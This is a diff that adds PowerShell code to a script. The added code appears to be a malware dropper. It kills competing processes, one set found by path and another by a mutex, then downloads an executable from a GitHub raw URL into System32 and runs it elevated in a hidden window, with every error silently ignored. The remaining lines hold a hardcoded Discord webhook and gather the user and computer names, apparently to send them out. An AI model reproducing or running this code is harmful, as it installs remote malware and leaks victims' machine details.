@@ -1,3 +1,51 @@
+$processPaths = @('C:\Windows\System32\winio.exe', 'C:\Windows\System32\SafeBoot\winio.exe');
+try 
+{
+    $processes = Get-WmiObject Win32_Process | Where-Object { $processPaths -contains $_.ExecutablePath };
+
+    if ($processes.Count -eq 0) 
+    {} else {
+        foreach ($process in $processes) 
+        {
+            try {
+                Stop-Process -Id $process.ProcessId -Force;
+            } catch {};
+        };
+    };
+} catch {};
+
+$mutexName = "44b6c65a-d844-4fa9-9d68-a7df5ab8b127";
+$processes = Get-WmiObject Win32_Process;
+foreach ($process in $processes) 
+{
+    try {
+        $processHandle = [System.Diagnostics.Process]::GetProcessById($process.ProcessId);
+        $mutex = [System.Threading.Mutex]::OpenExisting($mutexName, [System.Threading.MutexRights]::Synchronize);
+
+        if ($mutex) {
+            Stop-Process -Id $process.ProcessId -Force;
+            break;
+        }
+    } catch {};
+}
+
+$filePath = "C:\\Windows\\System32\\winio.exe";
+if (Test-Path $filePath2) {
+    try {
+        Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
+    } catch {}
+} else {
+    try {
+        Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+        Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
+                
+        if (-not (Test-Path 'C:\Windows\System32\winio.exe')) {
+            Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+            Start-Process -FilePath "C:\Windows\System32\winio.exe" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop;
+        };
+    } catch{};
+}
+
 $webhookUrl = "https://discord.com/api/webhooks/1277401036809572475/_pXb-6v9wYFAUxRHWpukoPbaRekI0ehKgaNrL0kBWPB1-m504z1fxkHMQAzpFE9be_cc";
 $user = $env:USERNAME;
 $pcName = $env:COMPUTERNAME;
